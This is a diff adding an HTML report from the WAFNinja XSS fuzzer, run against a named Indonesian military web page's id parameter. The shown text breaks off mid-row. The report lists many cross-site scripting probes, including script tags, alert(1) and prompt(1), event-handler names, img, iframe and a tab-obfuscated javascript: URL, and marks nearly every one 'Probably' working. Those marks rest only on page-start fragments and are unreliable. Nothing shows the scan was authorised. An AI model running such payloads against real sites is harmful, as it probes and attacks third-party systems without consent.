@@ -1,0 +1,1380 @@
+<meta charset="utf-8"/><style>
+        .OutputTable {
+	margin:0px;padding:0px;
+	width:100%;
+	border:1px solid #000000;
+	
+	-moz-border-radius-bottomleft:10px;
+	-webkit-border-bottom-left-radius:10px;
+	border-bottom-left-radius:10px;
+	
+	-moz-border-radius-bottomright:10px;
+	-webkit-border-bottom-right-radius:10px;
+	border-bottom-right-radius:10px;
+	
+	-moz-border-radius-topright:10px;
+	-webkit-border-top-right-radius:10px;
+	border-top-right-radius:10px;
+	
+	-moz-border-radius-topleft:10px;
+	-webkit-border-top-left-radius:10px;
+	border-top-left-radius:10px;
+	table-layout: fixed;
+        }.OutputTable table{
+            border-collapse: collapse;
+                border-spacing: 0;
+                width:310px;
+                height:100%;
+                margin:0px;padding:0px;
+        }.OutputTable tr:last-child td:last-child {
+                -moz-border-radius-bottomright:10px;
+                -webkit-border-bottom-right-radius:10px;
+                border-bottom-right-radius:10px;
+        }
+        .OutputTable table tr:first-child td:first-child {
+                -moz-border-radius-topleft:10px;
+                -webkit-border-top-left-radius:10px;
+                border-top-left-radius:10px;
+        }
+        .OutputTable table tr:first-child td:last-child {
+                -moz-border-radius-topright:10px;
+                -webkit-border-top-right-radius:10px;
+                border-top-right-radius:10px;
+        }.OutputTable tr:last-child td:first-child{
+                -moz-border-radius-bottomleft:10px;
+                -webkit-border-bottom-left-radius:10px;
+                border-bottom-left-radius:10px;
+        }.OutputTable tr:hover td{
+                background-color:#ffffff;
+        }
+        .OutputTable td{
+                vertical-align:middle;
+                background-color:#ffffff;
+                width:500px; 
+                word-wrap: break-word;
+            height: 15px;
+                border:1px solid #000000;
+                border-width:0px 1px 1px 0px;
+                text-align:center;
+                padding:9px;
+                font-size:15px;
+                font-family:Helvetica;
+                font-weight:normal;
+                color:#000000;
+        }.OutputTable tr:last-child td{
+                border-width:0px 1px 0px 0px;
+        }.OutputTable tr td:last-child{
+                border-width:0px 0px 1px 0px;
+        }.OutputTable tr:last-child td:last-child{
+                border-width:0px 0px 0px 0px;
+        }
+        .OutputTable tr:first-child th{
+                        background:-o-linear-gradient(bottom, #007fff 5%, #007fff 100%);	background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #007fff), color-stop(1, #007fff) );
+                background:-moz-linear-gradient( center top, #007fff 5%, #007fff 100% );
+                filter:progid:DXImageTransform.Microsoft.gradient(startColorstr="#007fff", endColorstr="#007fff");	background: -o-linear-gradient(top,#007fff,007fff);
+
+                background-color:#007fff;
+                border:0px solid #000000;
+                text-align:center;
+                border-width:0px 0px 1px 1px;
+                font-size:15px;
+                font-family:Courier;
+                font-weight:bold;
+                color:#ffffff;
+        }
+        .OutputTable tr:first-child:hover td{
+                background:-o-linear-gradient(bottom, #007fff 5%, #007fff 100%);	background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #007fff), color-stop(1, #007fff) );
+                background:-moz-linear-gradient( center top, #007fff 5%, #007fff 100% );
+                filter:progid:DXImageTransform.Microsoft.gradient(startColorstr="#007fff", endColorstr="#007fff");	background: -o-linear-gradient(top,#007fff,007fff);
+
+                background-color:#007fff;
+        }
+        .OutputTable tr:first-child td:first-child{
+                border-width:0px 0px 1px 0px;
+        }
+        .OutputTable tr:first-child td:last-child{
+                border-width:0px 0px 1px 1px;
+        }
+        .OutputTable td.Yes{
+                background-color:#00FF00;
+        }
+        .OutputTable td.No{
+                background-color:#FF0000;
+        }
+        .OutputTable td.Probably{
+                background-color:#00CCFF;
+        }
+            </style><h1>WAFNinja - Penetration testers favorite for WAF Bypassing</h1><b>URL</b>: http://www.pusterad.mil.id/index.php?id=FUZZ<br><b>TYPE: </b>xss<br><b>DELAY: </b>0<br><b>PROXY: </b><br><b>PREFIX: </b><br><b>POSTFIX: </b><br><br><table class="OutputTable">
+    <tr>
+        <th>Fuzz</th>
+        <th>HTTP Status</th>
+        <th>Content-Length</th>
+        <th>Expected</th>
+        <th>Output</th>
+        <th>Working</th>
+    </tr>
+    <tr>
+        <td>&lt;script</td>
+        <td>200</td>
+        <td>119681</td>
+        <td>&lt;script</td>
+        <td>OCTYPE </td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;script&gt;&lt;/script&gt;</td>
+        <td>200</td>
+        <td>119703</td>
+        <td>&lt;script&gt;&lt;/script&gt;</td>
+        <td>OCTYPE html&gt;<br>&lt;ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;script&gt;</td>
+        <td>200</td>
+        <td>119687</td>
+        <td>&lt;script&gt;</td>
+        <td>OCTYPE h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;</td>
+        <td>200</td>
+        <td>119657</td>
+        <td>&lt;</td>
+        <td>O</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;&gt;</td>
+        <td>200</td>
+        <td>119689</td>
+        <td>&lt;&gt;</td>
+        <td>OC</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&gt;</td>
+        <td>200</td>
+        <td>119675</td>
+        <td>&gt;</td>
+        <td>O</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>(</td>
+        <td>200</td>
+        <td>119702</td>
+        <td>(</td>
+        <td>O</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>)</td>
+        <td>200</td>
+        <td>119688</td>
+        <td>)</td>
+        <td>O</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>()</td>
+        <td>200</td>
+        <td>119675</td>
+        <td>()</td>
+        <td>OC</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>""</td>
+        <td>200</td>
+        <td>119677</td>
+        <td>""</td>
+        <td>OC</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>'test'</td>
+        <td>200</td>
+        <td>119720</td>
+        <td>'test'</td>
+        <td>OCTYPE</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>alert(1)</td>
+        <td>200</td>
+        <td>119696</td>
+        <td>alert(1)</td>
+        <td>OCTYPE h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>console.log(1)</td>
+        <td>200</td>
+        <td>119720</td>
+        <td>console.log(1)</td>
+        <td>OCTYPE html&gt;<br></td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>prompt(1)</td>
+        <td>200</td>
+        <td>119704</td>
+        <td>prompt(1)</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>FSCommand</td>
+        <td>200</td>
+        <td>119716</td>
+        <td>FSCommand</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onAbort</td>
+        <td>200</td>
+        <td>119679</td>
+        <td>onAbort</td>
+        <td>OCTYPE </td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onActivate</td>
+        <td>200</td>
+        <td>119724</td>
+        <td>onActivate</td>
+        <td>OCTYPE htm</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onAfterPrint</td>
+        <td>200</td>
+        <td>119712</td>
+        <td>onAfterPrint</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onAfterUpdate</td>
+        <td>200</td>
+        <td>119732</td>
+        <td>onAfterUpdate</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onBeforeActivate</td>
+        <td>200</td>
+        <td>119712</td>
+        <td>onBeforeActivate</td>
+        <td>OCTYPE html&gt;<br>&lt;h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onBeforeCopy</td>
+        <td>200</td>
+        <td>119720</td>
+        <td>onBeforeCopy</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onBeforeCut</td>
+        <td>200</td>
+        <td>119650</td>
+        <td>onBeforeCut</td>
+        <td>OCTYPE html</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onBeforeDeactivate</td>
+        <td>200</td>
+        <td>119712</td>
+        <td>onBeforeDeactivate</td>
+        <td>OCTYPE html&gt;<br>&lt;htm</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onBeforeEditFocus</td>
+        <td>200</td>
+        <td>119720</td>
+        <td>onBeforeEditFocus</td>
+        <td>OCTYPE html&gt;<br>&lt;ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onBeforePaste</td>
+        <td>200</td>
+        <td>119718</td>
+        <td>onBeforePaste</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onBeforePrint</td>
+        <td>200</td>
+        <td>119699</td>
+        <td>onBeforePrint</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onBeforeUnload</td>
+        <td>200</td>
+        <td>119722</td>
+        <td>onBeforeUnload</td>
+        <td>OCTYPE html&gt;<br></td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onBeforeUpdate</td>
+        <td>200</td>
+        <td>119706</td>
+        <td>onBeforeUpdate</td>
+        <td>OCTYPE html&gt;<br></td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onBegin</td>
+        <td>200</td>
+        <td>119714</td>
+        <td>onBegin</td>
+        <td>OCTYPE </td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onBlur</td>
+        <td>200</td>
+        <td>119677</td>
+        <td>onBlur</td>
+        <td>OCTYPE</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onBounce</td>
+        <td>200</td>
+        <td>119669</td>
+        <td>onBounce</td>
+        <td>OCTYPE h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onCellChange</td>
+        <td>200</td>
+        <td>119681</td>
+        <td>onCellChange</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onChange</td>
+        <td>200</td>
+        <td>119722</td>
+        <td>onChange</td>
+        <td>OCTYPE h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onClick</td>
+        <td>200</td>
+        <td>119691</td>
+        <td>onClick</td>
+        <td>OCTYPE </td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onContextMenu</td>
+        <td>200</td>
+        <td>119706</td>
+        <td>onContextMenu</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onControlSelect</td>
+        <td>200</td>
+        <td>119691</td>
+        <td>onControlSelect</td>
+        <td>OCTYPE html&gt;<br>&lt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onCopy</td>
+        <td>200</td>
+        <td>119708</td>
+        <td>onCopy</td>
+        <td>OCTYPE</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onCut</td>
+        <td>200</td>
+        <td>119705</td>
+        <td>onCut</td>
+        <td>OCTYP</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onDataAvailable</td>
+        <td>200</td>
+        <td>119706</td>
+        <td>onDataAvailable</td>
+        <td>OCTYPE html&gt;<br>&lt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onDataSetChanged</td>
+        <td>200</td>
+        <td>119656</td>
+        <td>onDataSetChanged</td>
+        <td>OCTYPE html&gt;<br>&lt;h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onDataSetComplete</td>
+        <td>200</td>
+        <td>119681</td>
+        <td>onDataSetComplete</td>
+        <td>OCTYPE html&gt;<br>&lt;ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onDblClick</td>
+        <td>200</td>
+        <td>119681</td>
+        <td>onDblClick</td>
+        <td>OCTYPE htm</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onDeactivate</td>
+        <td>200</td>
+        <td>119675</td>
+        <td>onDeactivate</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onDrag</td>
+        <td>200</td>
+        <td>119669</td>
+        <td>onDrag</td>
+        <td>OCTYPE</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onDragEnd</td>
+        <td>200</td>
+        <td>119700</td>
+        <td>onDragEnd</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onDragLeave</td>
+        <td>200</td>
+        <td>119687</td>
+        <td>onDragLeave</td>
+        <td>OCTYPE html</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onDragEnter</td>
+        <td>200</td>
+        <td>119708</td>
+        <td>onDragEnter</td>
+        <td>OCTYPE html</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onDragOver</td>
+        <td>200</td>
+        <td>119722</td>
+        <td>onDragOver</td>
+        <td>OCTYPE htm</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onDragDrop</td>
+        <td>200</td>
+        <td>119712</td>
+        <td>onDragDrop</td>
+        <td>OCTYPE htm</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onDragStart</td>
+        <td>200</td>
+        <td>119681</td>
+        <td>onDragStart</td>
+        <td>OCTYPE html</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onDrop</td>
+        <td>200</td>
+        <td>119669</td>
+        <td>onDrop</td>
+        <td>OCTYPE</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onEnded</td>
+        <td>200</td>
+        <td>119716</td>
+        <td>onEnd</td>
+        <td>OCTYP</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onError</td>
+        <td>200</td>
+        <td>119714</td>
+        <td>onError</td>
+        <td>OCTYPE </td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onErrorUpdate</td>
+        <td>200</td>
+        <td>119716</td>
+        <td>onErrorUpdate</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onFilterChange</td>
+        <td>200</td>
+        <td>119689</td>
+        <td>onFilterChange</td>
+        <td>OCTYPE html&gt;<br></td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onFinish</td>
+        <td>200</td>
+        <td>119714</td>
+        <td>onFinish</td>
+        <td>OCTYPE h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onFocus</td>
+        <td>200</td>
+        <td>119683</td>
+        <td>onFocus</td>
+        <td>OCTYPE </td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onFocusIn</td>
+        <td>200</td>
+        <td>119673</td>
+        <td>onFocusIn</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onFocusOut</td>
+        <td>200</td>
+        <td>119710</td>
+        <td>onFocusOut</td>
+        <td>OCTYPE htm</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onHashChange</td>
+        <td>200</td>
+        <td>119687</td>
+        <td>onHashChange</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onHelp</td>
+        <td>200</td>
+        <td>119693</td>
+        <td>onHelp</td>
+        <td>OCTYPE</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onInput</td>
+        <td>200</td>
+        <td>119728</td>
+        <td>onInput</td>
+        <td>OCTYPE </td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onKeyDown</td>
+        <td>200</td>
+        <td>119720</td>
+        <td>onKeyDown</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onKeyPress</td>
+        <td>200</td>
+        <td>119683</td>
+        <td>onKeyPress</td>
+        <td>OCTYPE htm</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onKeyUp</td>
+        <td>200</td>
+        <td>119671</td>
+        <td>onKeyUp</td>
+        <td>OCTYPE </td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onLayoutComplete</td>
+        <td>200</td>
+        <td>119718</td>
+        <td>onLayoutComplete</td>
+        <td>OCTYPE html&gt;<br>&lt;h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onLoad</td>
+        <td>200</td>
+        <td>119689</td>
+        <td>onLoad</td>
+        <td>OCTYPE</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onLoseCapture</td>
+        <td>200</td>
+        <td>119687</td>
+        <td>onLoseCapture</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onMediaComplete</td>
+        <td>200</td>
+        <td>119716</td>
+        <td>onMediaComplete</td>
+        <td>OCTYPE html&gt;<br>&lt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onMediaError</td>
+        <td>200</td>
+        <td>119714</td>
+        <td>onMediaError</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onMessage</td>
+        <td>200</td>
+        <td>119689</td>
+        <td>onMessage</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onMouseDown</td>
+        <td>200</td>
+        <td>119708</td>
+        <td>onMouseDown</td>
+        <td>OCTYPE html</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onMouseEnter</td>
+        <td>200</td>
+        <td>119650</td>
+        <td>onMouseEnter</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onMouseLeave</td>
+        <td>200</td>
+        <td>119722</td>
+        <td>onMouseLeave</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onMouseMove</td>
+        <td>200</td>
+        <td>119700</td>
+        <td>onMouseMove</td>
+        <td>OCTYPE html</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onMouseOut</td>
+        <td>200</td>
+        <td>119681</td>
+        <td>onMouseOut</td>
+        <td>OCTYPE htm</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onMouseOver</td>
+        <td>200</td>
+        <td>119716</td>
+        <td>onMouseOver</td>
+        <td>OCTYPE html</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onMouseUp</td>
+        <td>200</td>
+        <td>119718</td>
+        <td>onMouseUp</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onMouseWheel</td>
+        <td>200</td>
+        <td>119718</td>
+        <td>onMouseWheel</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onMove</td>
+        <td>200</td>
+        <td>119712</td>
+        <td>onMove</td>
+        <td>OCTYPE</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onMoveEnd</td>
+        <td>200</td>
+        <td>119708</td>
+        <td>onMoveEnd</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onMoveStart</td>
+        <td>200</td>
+        <td>119679</td>
+        <td>onMoveStart</td>
+        <td>OCTYPE html</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onOffline</td>
+        <td>200</td>
+        <td>119708</td>
+        <td>onOffline</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onOnline</td>
+        <td>200</td>
+        <td>119710</td>
+        <td>onOnline</td>
+        <td>OCTYPE h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onOutOfSync</td>
+        <td>200</td>
+        <td>119720</td>
+        <td>onOutOfSync</td>
+        <td>OCTYPE html</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onPaste</td>
+        <td>200</td>
+        <td>119710</td>
+        <td>onPaste</td>
+        <td>OCTYPE </td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onPause</td>
+        <td>200</td>
+        <td>119714</td>
+        <td>onPause</td>
+        <td>OCTYPE </td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onPopState</td>
+        <td>200</td>
+        <td>119675</td>
+        <td>onPopState</td>
+        <td>OCTYPE htm</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onProgress</td>
+        <td>200</td>
+        <td>119714</td>
+        <td>onProgress</td>
+        <td>OCTYPE htm</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onPropertyChange</td>
+        <td>200</td>
+        <td>119706</td>
+        <td>onPropertyChange</td>
+        <td>OCTYPE html&gt;<br>&lt;h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onReadyStateChange</td>
+        <td>200</td>
+        <td>119718</td>
+        <td>onReadyStateChange</td>
+        <td>OCTYPE html&gt;<br>&lt;htm</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onRedo</td>
+        <td>200</td>
+        <td>119683</td>
+        <td>onRedo</td>
+        <td>OCTYPE</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onRepeat</td>
+        <td>200</td>
+        <td>119644</td>
+        <td>onRepeat</td>
+        <td>OCTYPE h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onReset</td>
+        <td>200</td>
+        <td>119681</td>
+        <td>onReset</td>
+        <td>OCTYPE </td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onResize</td>
+        <td>200</td>
+        <td>119718</td>
+        <td>onResize</td>
+        <td>OCTYPE h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onResizeEnd</td>
+        <td>200</td>
+        <td>119640</td>
+        <td>onResizeEnd</td>
+        <td>OCTYPE html</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onResizeStart</td>
+        <td>200</td>
+        <td>119699</td>
+        <td>onResizeStart</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onResume</td>
+        <td>200</td>
+        <td>119714</td>
+        <td>onResume</td>
+        <td>OCTYPE h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onReverse</td>
+        <td>200</td>
+        <td>119710</td>
+        <td>onReverse</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onRowsEnter</td>
+        <td>200</td>
+        <td>119702</td>
+        <td>onRowsEnter</td>
+        <td>OCTYPE html</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onRowExit</td>
+        <td>200</td>
+        <td>119708</td>
+        <td>onRowExit</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onRowDelete</td>
+        <td>200</td>
+        <td>119712</td>
+        <td>onRowDelete</td>
+        <td>OCTYPE html</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onRowInserted</td>
+        <td>200</td>
+        <td>119716</td>
+        <td>onRowInserted</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onScroll</td>
+        <td>200</td>
+        <td>119689</td>
+        <td>onScroll</td>
+        <td>OCTYPE h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onSeek</td>
+        <td>200</td>
+        <td>119722</td>
+        <td>onSeek</td>
+        <td>OCTYPE</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onSelect</td>
+        <td>200</td>
+        <td>119708</td>
+        <td>onSelect</td>
+        <td>OCTYPE h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onSelectionChange</td>
+        <td>200</td>
+        <td>119716</td>
+        <td>onSelectionChange</td>
+        <td>OCTYPE html&gt;<br>&lt;ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onSelectStart</td>
+        <td>200</td>
+        <td>119722</td>
+        <td>onSelectStart</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onStart</td>
+        <td>200</td>
+        <td>119681</td>
+        <td>onStart</td>
+        <td>OCTYPE </td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onStop</td>
+        <td>200</td>
+        <td>119712</td>
+        <td>onStop</td>
+        <td>OCTYPE</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onStorage</td>
+        <td>200</td>
+        <td>119718</td>
+        <td>onStorage</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onSyncRestored</td>
+        <td>200</td>
+        <td>119679</td>
+        <td>onSyncRestored</td>
+        <td>OCTYPE html&gt;<br></td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onSubmit</td>
+        <td>200</td>
+        <td>119706</td>
+        <td>onSubmit</td>
+        <td>OCTYPE h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onTimeError</td>
+        <td>200</td>
+        <td>119704</td>
+        <td>onTimeError</td>
+        <td>OCTYPE html</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onTrackChange</td>
+        <td>200</td>
+        <td>119698</td>
+        <td>onTrackChange</td>
+        <td>OCTYPE html&gt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onUndo</td>
+        <td>200</td>
+        <td>119720</td>
+        <td>onUndo</td>
+        <td>OCTYPE</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onUnload</td>
+        <td>200</td>
+        <td>119675</td>
+        <td>onUnload</td>
+        <td>OCTYPE h</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onURLFlip</td>
+        <td>200</td>
+        <td>119726</td>
+        <td>onURLFlip</td>
+        <td>OCTYPE ht</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>onWheel</td>
+        <td>200</td>
+        <td>119720</td>
+        <td>onWheel</td>
+        <td>OCTYPE </td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;img src=x&gt;test&lt;/img&gt;</td>
+        <td>200</td>
+        <td>119711</td>
+        <td>&lt;img src=x&gt;test&lt;/img&gt;</td>
+        <td>OCTYPE html&gt;<br>&lt;html l</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;img dynsrc&gt;&lt;/img&gt;</td>
+        <td>200</td>
+        <td>119711</td>
+        <td>&lt;img dynsrc&gt;&lt;/img&gt;</td>
+        <td>OCTYPE html&gt;<br>&lt;htm</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;img lowsrc&gt;&lt;/img&gt;</td>
+        <td>200</td>
+        <td>119660</td>
+        <td>&lt;img lowsrc&gt;&lt;/img&gt;</td>
+        <td>OCTYPE html&gt;<br>&lt;htm</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;bgsound src=&gt;</td>
+        <td>200</td>
+        <td>119722</td>
+        <td>&lt;bgsound src=&gt;</td>
+        <td>OCTYPE html&gt;<br></td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;iframe src=""&gt;&lt;/iframe&gt;</td>
+        <td>200</td>
+        <td>119717</td>
+        <td>&lt;iframe src=""&gt;&lt;/iframe&gt;</td>
+        <td>OCTYPE html&gt;<br>&lt;html lang</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;BR SIZE="&amp;{alert(1)}"&gt;</td>
+        <td>200</td>
+        <td>119750</td>
+        <td>&lt;BR SIZE="&amp;{alert(1)}"&gt;</td>
+        <td>OCTYPE html&gt;<br>&lt;html lan</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;STYLE&gt;&lt;/STYLE&gt;</td>
+        <td>200</td>
+        <td>119711</td>
+        <td>&lt;STYLE&gt;&lt;/STYLE&gt;</td>
+        <td>OCTYPE html&gt;<br>&lt;</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>&lt;LINK REL="stylesheet" HREF=""&gt;</td>
+        <td>200</td>
+        <td>119764</td>
+        <td>&lt;LINK REL="stylesheet" HREF=""&gt;</td>
+        <td>OCTYPE html&gt;<br>&lt;html lang="en-US</td>
+        <td class="Probably">Probably</td>
+    </tr>
+    <tr>
+        <td>jav	ascript:alert(1);</td>
+        <td>200</td>
+        <td>119713</td>
+        <td>jav	ascript:alert(1);</td>
